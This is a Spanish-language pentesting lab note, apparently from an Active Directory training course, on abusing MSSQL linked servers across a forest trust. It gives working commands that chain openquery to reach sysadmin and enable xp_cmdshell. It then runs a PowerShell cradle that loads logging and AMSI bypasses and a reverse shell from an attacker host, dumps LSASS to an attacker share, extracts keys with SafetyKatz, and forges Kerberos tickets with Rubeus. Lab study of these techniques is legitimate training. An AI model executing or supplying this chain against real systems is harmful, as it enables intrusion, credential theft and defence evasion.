# MSSQL Linked 

Tags: #AD #MSSQL 

- Los servidores **MS SQL** suelen desplegarse ampliamente dentro de un dominio Windows.
- Los servidores SQL ofrecen muy buenas opciones para **movimiento lateral**, ya que los usuarios del dominio pueden ser asignados a roles dentro de la base de datos.
- Para trabajar con **MSSQL y PowerShell**, se puede utilizar **PowerUpSQL**:  
    [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

## Enumeración 

```powershell 
❯ Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1     # Importar la tool 
```

```powershell 
! Usuario: Usuario de dominio

Paso 1:
❯ Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
# Enumerar instancias de SQL Server en el dominio via SPN Scanning — identifica servidores MSSQL registrados en AD


	# Obtenemos 
	ComputerName        : dcorp-mssql.dollarcorp.moneycorp.local     !IMPORTANTE
	Instance            : DCORP-MSSQL                                !IMPORTANTE
	DomainName          : dcorp
	ServiceProcessID    : 1896
	ServiceName         : MSSQLSERVER
	ServiceAccount      : NT Service\MSSQLSERVER
	AuthenticationMode  : Windows and SQL Server Authentication
	ForcedEncryption    : 0
	Clustered           : No
	SQLServerVersionNumber  : 15.0.2000.5
	SQLServerMajorVersion   : 2019
	SQLServerEdition    : Developer Edition (64-bit)
	SQLServerServicePack    : RTM
	OSArchitecture      : X64
	OsVersionNumber     : SQL
	Currentlogin        : dcorp\studentx                             !IMPORTANTE
	IsSysadmin          : No
	ActiveSessions      : 1


```

```powershell 
Paso 2: 
- Conectarse con 'heidisql.exe' a la base de datos MSSQL
```

![[Pasted image 20260606144158.png]]

```powershell 
Paso 3:

# Ejecutar la Query
❯ select * from master..sysservers
```

![[Pasted image 20260606144420.png]]

```powershell 
Paso 4:

# Ejecutar la Query
❯ select * from openquery("DCORP-SQL1",'select * from master..sysservers')
```

![[Pasted image 20260606144649.png]]

```powershell 
Paso 5:

# Ejecutar la Query
❯ select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
```

![[Pasted image 20260606144728.png]]


```powershell 
! Usuario: Usuario de dominio

❯ Get-SQLConnectionTestThreaded
# Verificar accesibilidad a instancias SQL Server usando el usuario actual.

Paso (Checar):
❯ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
# Enumerar instancias SQL del dominio y verificar accesibilidad a todas ellas en paralelo.

Paso (Checar):
❯ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
# Enumerar instancias SQL del dominio y recopilar información detallada de cada servidor — versión, nombre, usuario conectado, etc.
	- `ComputerName`        → el servidor MSSQL es 'dcorp-mssql.dollarcorp.moneycorp.local'
	- `ServiceAccount`      → corre como 'NT AUTHORITY\NETWORKSERVICE' — cuenta de bajo privilegio
	- `AuthenticationMode`  → acepta 'Windows y SQL Server auth' — puedes autenticarte de ambas formas
	- `CurrentLogin`        → estás conectado como 'dcorp\student1'
	- `IsSysadmin`          → 'No' — no tienes privilegios de sysadmin en el SQL Server

Nota: El dato clave es 'IsSysadmin: No' — eso define qué puedes y qué no puedes hacer directamente en este servidor, y por eso necesitas buscar links hacia otros servidores donde quizás sí tengas más privilegios.
```

## Trust Abuse - Database Links 

- Un **database link** permite que un servidor SQL acceda a fuentes de datos externas, como otros servidores SQL y fuentes de datos **OLE DB**.
- En el caso de enlaces entre servidores SQL (linked SQL servers), es posible ejecutar **stored procedures**.
- Los **database links** funcionan incluso a través de relaciones de confianza entre bosques (_forest trusts_).

```powershell 
! Usuario: Usuario de dominio con acceso a la instancia SQL

Paso (Checar):
❯ Get-SQLServerLink -Instance dcorp-mssql -Verbose
# Enumerar database links configurados en la instancia MSSQL — identifica servidores remotos enlazados para movimiento lateral vía linked servers.
	- `DatabaseLinkName: DCORP-SQL1` → hay un link hacia 'dcorp-sql1' — este es el 'servidor B' de tu diagrama
	- `DatabaseLinkLocation: Remote` → es un servidor externo enlazado
	- `is_data_access_enabled: True` → puede consultar datos — 'esto es lo que permite el salto'
	- `is_rpc_out_enabled: False` → no puede ejecutar RPC directamente desde aquí


❯ select * from master..sysservers
# Igual que el anterior pero usando una query SQL directa — lista todos los servidores enlazados registrados en la instancia.
```

```powershell 
! Usuario: Usuario de dominio con acceso a la instancia SQL

❯ select * from openquery("dcorp-sql1",'select * from master..sysservers')
# Ejecutar una query en el servidor enlazado dcorp-sql1 para enumerar sus database links — permite descubrir si existe un link hacia otra mssql y continuar la cadena de saltos.

```

```powershell 
! Usuario: Usuario de dominio con acceso a la instancia SQL

Paso 6:
❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
# Enumerar automáticamente toda la cadena de database links desde dcorp-mssql — descubre todos los servidores enlazados de forma recursiva incluyendo los links anidados hacia eurocorp.
	
	
	# Obtenemos 
	Version     : SQL Server 2019
	Instance    : DCORP-MSSQL
	CustomQuery :
	Sysadmin    : 0
	Path        : {DCORP-MSSQL}            !IMPORTANTE
	User        : dcorp\student892         !IMPORTANTE
	Links       : {DCORP-SQL1}             !IMPORTANTE
	
	Version     : SQL Server 2019
	Instance    : DCORP-SQL1
	CustomQuery :
	Sysadmin    : 0
	Path        : {DCORP-MSSQL, DCORP-SQL1}    !IMPORTANTE
	User        : dblinkuser                   !IMPORTANTE
	Links       : {DCORP-MGMT}                 !IMPORTANTE
	
	Version     : SQL Server 2019
	Instance    : DCORP-MGMT
	CustomQuery :
	Sysadmin    : 0
	Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}   !IMPORTANTE
	User        : sqluser                                 !IMPORTANTE
	Links       : {EU-SQL35.EU.EUROCORP.LOCAL}            !IMPORTANTE
	
	Version     : SQL Server 2019
	Instance    : EU-SQL35
	CustomQuery :
	Sysadmin    : 1
	Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL35.EU.EUROCORP.LOCAL}   !IMPORTANTE
	User        : sa                                                                  !IMPORTANTE
	Links       :                                                                     !IMPORTANTE


	# Donde:
	PATH: DCORP-MSSQL → DCORP-SQL1 → DCORP-MGMT → EU-SQL1.EU.EUROCORP.LOCAL
	- DCORP-MSSQL   → login: `dcorp\student892` — IsSysAdmin: '0' (público)
	- DCORP-SQL1    → login: `dblinkuser` — IsSysAdmin: '0' (sin privilegios)
	- DCORP-MGMT    → login: `sqluser` — IsSysAdmin: '0' (sin privilegios)
	- EU-SQL1       → login: `sa` — IsSysAdmin: '1' ← aquí está el premio
	  
Nota: En EU-SQL1 (otro bosque — eu.eurocorp.local) eres 'sa' (sysadmin total). Con sa puedes habilitar 'xp_cmdshell' y ejecutar comandos del OS en ese servidor


❯ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from master..sysservers")')
# Encadenar openquery para saltar de dcorp-mssql → dcorp-sql1 → dcorp-mgmt y enumerar los database links del tercer servidor — permite mapear la cadena completa de links anidados hasta eurocorp.
```

```powershell
! Usuario: Usuario de dominio con acceso sa en otro mssql via linked servers

❯ EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"
# Habilitar xp_cmdshell en eu-sql usando RPC (AT) — requiere que rpcout esté habilitado en el link. Permite ejecutar comandos del OS en el servidor del otro bosque.
```

```powershell 
! Usuario: Usuario de dominio con acceso sa en otro mssql via linked servers

NOTA: Si en EU-SQL35 está habilitado xp_cmdshell, se puede ejecutar comandos del sistema operativo Windows desde SQL Server como en el siguiente comando:

Paso 7:
❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local  -Query "exec master..xp_cmdshell 'set username'"
# Ejecutar un comando OS en eu-sql específicamente usando -QueryTarget — sin este parámetro intentaría ejecutar xp_cmdshell en todos los servidores de la cadena


	# Obtenemos 
	Version     : SQL Server 2019
	Instance    : DCORP-MSSQL
	CustomQuery :
	Sysadmin    : 0
	Path        : {DCORP-MSSQL}
	User        : dcorp\student892
	Links       : {DCORP-SQL1}
	
	Version     : SQL Server 2019
	Instance    : DCORP-SQL1
	CustomQuery :
	Sysadmin    : 0
	Path        : {DCORP-MSSQL, DCORP-SQL1}
	User        : dblinkuser
	Links       : {DCORP-MGMT}
	
	Version     : SQL Server 2019
	Instance    : DCORP-MGMT
	CustomQuery :
	Sysadmin    : 0
	Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
	User        : sqluser
	Links       : {EU-SQL35.EU.EUROCORP.LOCAL}
	
	Version     : SQL Server 2019                         !IMPORTANTE
	Instance    : EU-SQL35                                !IMPORTANTE
	CustomQuery : {USERNAME=SYSTEM, }                     !IMPORTANTE
	Sysadmin    : 1                                       !IMPORTANTE
	Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL35.EU.EUROCORP.LOCAL}   !IMPORTANTE
	User        : sa                                      !IMPORTANTE
	Links       :                                         !IMPORTANTE



❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql

```

```powershell 
Paso 8:
! Utilizar Invoke-PowerShellTcp.ps1, renombrarlo como Invoke-PowerShellTcpEx.ps1 y compartirlo con 'HFS'
# Editar el archivo y agregar el siguiente comando al final:
❯ Power -Reverse -IPAddress 172.16.100.X -Port 443

Paso 9:
❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Amsi-Byp.txt);iex (iwr -UseBasicParsing http://172.16.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sqlx
# Ejecutar un cradle de PowerShell en eu-sql1 via xp_cmdshell para cargar bypass de logging, bypass de AMSI y una reverse shell — obtiene ejecución de código en el servidor del otro bosque (eu.eurocorp.local)

❯ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami"'''')'')')
# Ejecutar comandos OS en eu-sql encadenando openquery anidados manualmente desde dcorp-mssql — recorre toda la cadena dcorp-mssql → dcorp-sql1 → dcorp-mgmt → eu-sql para ejecutar whoami via xp_cmdshell.

Paso 10:
❯ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443      
# Ejecutar el listener 
	
	❯ $env:username
	❯ $env:computername
```

## Volcar LSASS manera segura de otro MSSQL vía Linked Servers 

```powershell 
! Usuario: Usuario de dominio con acceso sa en otro mssql via linked servers

❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\FindLSASSPID.exe''' -QueryTarget eu-sql1
# Ejecutar FindLSASSPID.exe en eu-sql1 desde un share UNC de la máquina del atacante via xp_cmdshell — obtiene el PID de LSASS en el servidor remoto sin necesidad de subir el binario al disco del objetivo.

❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sql1
# Verificar conectividad y obtener la versión de SQL Server en eu-sql1 — útil para confirmar que la cadena de links funciona antes de ejecutar comandos más agresivos.

❯ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\minidumpdotnet.exe 696 \\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\monkey1.dmp''' -QueryTarget eu-sql1
# Ejecutar minidumpdotnet.exe en eu-sql1 via xp_cmdshell pasando el PID de LSASS (696) obtenido previamente — vuelca LSASS directamente al share UNC del atacante sin tocar el disco del objetivo, evadiendo AV/EDR.
```

```powershell 
! Usuario: Administrador local o Domain Admin

❯ C:\AD\Tools\safetykatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare1\monkey1.dmp" "sekurlsa::evasive-keys" "exit"
# Cargar el dump de LSASS obtenido remotamente y extraer las claves AES/NTLM de las cuentas — análisis offline del dump de eu-sql1 sin interactuar directamente con el proceso LSASS del objetivo.
```

```powershell 
! Usuario: Administrador local o Domain Admin

❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# Cargar Rubeus en memoria y solicitar un TGT para dbadmin del bosque eurocorp usando su clave AES256 obtenida del dump de LSASS — inyecta el ticket en un proceso sacrificio para acceder al otro bosque de forma OPSEC-friendly.
```

```powershell 
! Usuario: Administrador local o Domain Admin (con TGT de dbadmin inyectado)

❯ C:\AD\Tools\WSManWinRM.exe eu-sql1.eu.eurocorp.local "cmd /c set username & C:\Windows\ccmcache\"
# Abrir una conexión WinRM hacia eu-sql1 en el bosque eurocorp usando el TGT inyectado — verifica acceso y contexto de usuario en el servidor del otro bosque.

❯ winrs -r:eu-sql1.eu.eurocorp.local cmd
# Abrir una shell remota en eu-sql1 del bosque eurocorp via WinRM usando el TGT de dbadmin inyectado — confirma acceso interactivo al servidor del otro bosque.
	❯ set username 
```